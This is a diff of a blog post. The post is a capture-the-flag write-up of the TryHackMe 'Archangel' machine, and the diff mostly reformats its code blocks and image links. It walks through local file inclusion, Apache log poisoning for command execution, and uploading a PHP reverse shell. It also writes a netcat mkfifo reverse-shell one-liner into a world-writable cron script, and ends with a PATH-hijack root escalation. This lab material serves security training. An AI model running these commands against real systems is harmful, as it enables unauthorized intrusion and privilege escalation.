@@ -4,12 +4,11 @@ categories: [tryhackme,Linux Machines]
 tags: [tryhackme, CTF]
 ---
 
-## Enumeration
+### nmap
 
 
-Starting off with an nmap scan shows SSH and HTTP open
-
-`root@kali:~/ctfs/thm/archangle# nmap -sC -sV 10.10.43.206
+```shel
+root@kali:~/ctfs/thm/archangle# nmap -sC -sV 10.10.43.206
 
 Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-04 14:01 EST
 Nmap scan report for mafialive.thm (10.10.169.125)
@@ -26,17 +25,18 @@ PORT   STATE SERVICE VERSION
 |_/test.php
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel` 
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+```
 
 Navigating to the website, I see a normal looking website, however I see another hostname of `mafialive.thm` under `Send us Mail`
 
 
-![website](https://spy0x7.cf/assets/archangel/website.png)
+![website](/assets/archangel/website.png)
 
 I add this hostname to my `/etc/hosts` file and navigate to the new website and the first flag.
 
 
-![flag1](https://spy0x7.cf/assets/archangel/flag1.png)
+![flag1](/assets/archangel/flag1.png)
 
 found `test.php` on  robots.txt on `mafialive.thm` 
 
@@ -44,12 +44,12 @@ found `test.php` on  robots.txt on `mafialive.thm`
 Navigating to `test.php` I find a button
 
 
-![test](https://spy0x7.cf/assets/archangel/test.png)
+![test](/assets/archangel/test.png)
 
 Pressing the button I find the URL changes to `test.php?view=/var/www/html/development_testing/mrrobot.php`
 
 
-![test1](https://spy0x7.cf/assets/archangel/test1.png)
+![test1](/assets/archangel/test1.png)
 
 
 ## Exploit
@@ -59,26 +59,27 @@ Pressing the button I find the URL changes to `test.php?view=/var/www/html/devel
 
 The URL shown can be vulnerable to several things, such as SQL injection, directory traversal, RFI and LFI. Testing one by one I find most of them end with a `Not Allowed` response.
 
-![notallowed](https://spy0x7.cf/assets/archangel/notallowed.png)
+![notallowed](/assets/archangel/notallowed.png)
 
 
 Testing [PHP Wrappers](https://medium.com/@Aptive/local-file-inclusion-lfi-web-application-penetration-testing-cc9dc8dd3601) for LFI, I find that it is possible to convert the page to base64
 
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/mrrobot.php`
 
-![base64](https://spy0x7.cf/assets/archangel/base64.png)
+![base64](/assets/archangel/base64.png)
 
 
 Trying to read /etc/passwd still fails, so I try to read the test.php file instead to see what filtering is happening
 
 `http://mafialive.thm/test.php?view=php://filter/convert.base64-encode/resource=/var/www/html/development_testing/test.php`
 
-![base64](https://spy0x7.cf/assets/archangel/base.png)
+![base64](/assets/archangel/base.png)
 
 
 This gives a long base64 value. I save it to my machine then decrypt it
 
 
+```
 root@kali:~/ctfs/thm/archangle# cat base | base64 -d
 
 <!DOCTYPE HTML>
@@ -109,7 +110,7 @@ root@kali:~/ctfs/thm/archangle# cat base | base64 -d
 </body>
 
 </html>
-
+```
 
 
 ### Log Poisoning
@@ -122,7 +123,7 @@ I test the double backslash to see if I can read /etc/passwd.
 `http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//..//etc/passwd`
 
 
-![passwd](https://spy0x7.cf/assets/archangel/passwd.png)
+![passwd](/assets/archangel/passwd.png)
 
 I can now use this to search the box. Looking for SSH keys do not work and I can’t read any useful files, so I try log poisoning. First, I need to find where the logs are stored. Testing the default places, I find `/var/log/apache2/access.log` contains all logs for the HTTP server.
 
@@ -130,7 +131,7 @@ I can now use this to search the box. Looking for SSH keys do not work and I can
 `view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log`
 
 
-![log](https://spy0x7.cf/assets/archangel/log.png)
+![log](/assets/archangel/log.png)
 
 
 Scrolling to the bottom of this log file, I see all of my requests through the LFI vulnerable.
@@ -140,14 +141,14 @@ Scrolling to the bottom of this log file, I see all of my requests through the L
 
 Refreshing access.log, I see my php code is now in the log file
 
-![php](https://spy0x7.cf/assets/archangel/php.png)
+![php](/assets/archangel/php.png)
 
 I can now test command execution
 
 `view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=whoami`
 
 
-![www](https://spy0x7.cf/assets/archangel/www.png)
+![www](/assets/archangel/www.png)
 
 
 Since I can execute commands, I can upload files. Using a [PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) I can upload this file and then navigate to it. I setup up a python HTTP Server on my local machine then use wget to upload the file
@@ -161,13 +162,13 @@ It was uploaded correctly, now I need to see where it is exactly. Running a pwd 
 
 `view-source:http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//..//var/log/apache2/access.log&c=pwd`
 
-![pwd](https://spy0x7.cf/assets/archangel/pwd.png)
+![pwd](/assets/archangel/pwd.png)
 
 
 With the file now uploaded, I can set up a netcat listener and navigate to `http://mafialive.thm/php-reverse-shell.php` to gain a reverse shell
 
-
-`root@kali:~/ctfs/thm/archangle# nc -lvnp 1234
+```
+root@kali:~/ctfs/thm/archangle# nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [10.2.8.75] from (UNKNOWN) [10.10.166.10] 40070
 Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
@@ -175,31 +176,32 @@ Linux ubuntu 4.15.0-123-generic #126-Ubuntu SMP Wed Oct 21 09:40:11 UTC 2020 x86
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 /bin/sh: 0: can't access tty; job control turned off
-$`
+$
+```
 
 I first import python3 into the shell
 
-
-`$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 www-data@ubuntu:/$ ^Z
 [1]+  Stopped                 nc -lvnp 1234
 root@kali:~/tryhackme/archangle# stty raw -echo
 root@kali:~/tryhackme/archangle# fg
 
-www-data@ubuntu:/$`
-
+www-data@ubuntu:/$
+```
 
 I can now read the second flag
 
-![flag2](https://spy0x7.cf/assets/archangel/flag2.png)
+![flag2](/assets/archangel/flag2.png)
 
 
 Exploiting archangel User
 
 To start, I uploaded and ran linpeas.sh
 
-
-`www-data@ubuntu:/tmp$ wget 10.2.8.75/linpeas.sh
+```
+www-data@ubuntu:/tmp$ wget 10.2.8.75/linpeas.sh
 
 --2021-02-05 01:43:42--  http://10.2.8.75/linpeas.sh
 Connecting to 10.2.8.75:80... connected.
@@ -211,66 +213,69 @@ linpeas.sh          100%[===================>] 224.31K  61.4KB/s    in 3.7s
 
 2021-02-05 01:43:47 (61.4 KB/s) - 'linpeas.sh' saved [229696/229696]
                                                
-www-data@ubuntu:/tmp$ bash linpeas.sh`
+www-data@ubuntu:/tmp$ bash linpeas.sh
+```
 
 
 Looking through the results, I find a cronjob for the archangel user
 
-
-`[+] Cron jobs 
+```
+[+] Cron jobs 
 
 .............................................
 
-*/1 *   * * *   archangel /opt/helloworld.sh`
-
+*/1 *   * * *   archangel /opt/helloworld.sh
+```
 
 Checking out this file, I see it runs a basic echo script.
 
-
-`www-data@ubuntu:/opt$ cat helloworld.sh 
+```
+www-data@ubuntu:/opt$ cat helloworld.sh 
 #!/bin/bash
-echo "hello world" >> /opt/backupfiles/helloworld.txt`
-
+echo "hello world" >> /opt/backupfiles/helloworld.txt
+```
 
 Looking at the permissions, I find everyone has permission to write to this file
 
-
-`www-data@ubuntu:/opt$ ls -la helloworld.sh 
--rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 helloworld.sh`
-
+```
+www-data@ubuntu:/opt$ ls -la helloworld.sh 
+-rwxrwxrwx 1 archangel archangel 66 Nov 20 10:35 helloworld.sh
+```
 
 Since I can write to the file, I put in a reverse shell
 
-
-`www-data@ubuntu:/opt$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.8.75 1234 >/tmp/f" > helloworld.sh`
-
+```
+www-data@ubuntu:/opt$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.2.8.75 1234 >/tmp/f" > helloworld.sh
+```
 
 After setting up a netcat listener and waiting for a few moments, I get a connect back as archangel
 
-`root@kali:~/tryhackme/archangle# nc -lvnp 1234
+```
+root@kali:~/tryhackme/archangle# nc -lvnp 1234
 listening on [any] 1234 ...
 connect to [10.2.8.75] from (UNKNOWN) [10.10.166.10] 40080
 /bin/sh: 0: can't access tty; job control turned off
 
 $ whoami
-archangel`
-
+archangel
+```
 
 Again, I import python3 into the shell
 
-`$ python3 -c 'import pty;pty.spawn("/bin/bash")'
+```
+$ python3 -c 'import pty;pty.spawn("/bin/bash")'
 archangel@ubuntu:~$ ^Z
 [1]+  Stopped                 nc -lvnp 1234
 root@kali:~/tryhackme/archangle# stty raw -echo
 root@kali:~/tryhackme/archangle# fg
 
-archangel@ubuntu:~$`
-
+archangel@ubuntu:~$
+```
 
 Now, I can read the 3rd flag
 
 
-![flag3](https://spy0x7.cf/assets/archangel/flag3.jpg)
+![flag3](/assets/archangel/flag3.jpg)
 
 
 ## Privilege Escalation to root
@@ -278,18 +283,20 @@ Now, I can read the 3rd flag
 
 Under the secrets folder, I find a file named backup. Looking into this file, I find it is an ELF executable owned by root but can be executed by anyone
 
-
-`archangel@ubuntu:~/secret$ file backup 
+```
+archangel@ubuntu:~/secret$ file backup 
 backup: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9093af828f30f957efce9020adc16dc214371d45, for GNU/Linux 3.2.0, not stripped
 
 archangel@ubuntu:~/secret$ ls -la backup 
--rwsr-xr-x 1 root root 16904 Nov 18 16:40 backup`
+-rwsr-xr-x 1 root root 16904 Nov 18 16:40 backup
+```
 
 
 I would like to know what this executable does, so I run strings against it. Here I find that it copies all files in the myfiles folder using cp.
 
 
-`archangel@ubuntu:~/secret$ strings backup 
+```
+archangel@ubuntu:~/secret$ strings backup 
 /lib64/ld-linux-x86-64.so.2
 setuid        
 system      
@@ -303,32 +310,35 @@ __gmon_start__
 _ITM_registerTMCloneTable
 u+UH                       
 []A\A]A^A_
-cp /home/user/archangel/myfiles/* /opt/backupfiles`
-
+cp /home/user/archangel/myfiles/* /opt/backupfiles
+```
 
 
 This does not use the full path for cp, which means it is vulnerable to a [Path Variable Privilege Escaltion](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/). By default on linux, most variables are under sbin or bin. However we can create our own path and variable for cp so when we execute this file, it will execute the CP located in our path.
 
 To start, we must craft a file named cp. I did this under the `/tmp` directory
 
-`archangel@ubuntu:/tmp$ echo "/bin/bash" > cp
-archangel@ubuntu:/tmp$ chmod 777 cp`
-
+```
+archangel@ubuntu:/tmp$ echo "/bin/bash" > cp
+archangel@ubuntu:/tmp$ chmod 777 cp
+```
 
 Now, I need to change my PATH variable to /tmp
 
-
-`archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH`
-
+```
+archangel@ubuntu:/tmp$ export PATH=/tmp:$PATH
+```
 
 With my path changed, when I execute backup, it will look for the cp file under the tmp directory and execute it. Since root owns the file, root will excute it
 
-`archangel@ubuntu:/tmp$ ~/secret/backup 
-root@ubuntu:/tmp#`
+```
+archangel@ubuntu:/tmp$ ~/secret/backup 
+root@ubuntu:/tmp#
+```
 
 As root, I can now read the final flag
 
-![root](https://spy0x7.cf/assets/archangel/root.png)
+![root](/assets/archangel/root.png)
 
 
 Exit.py
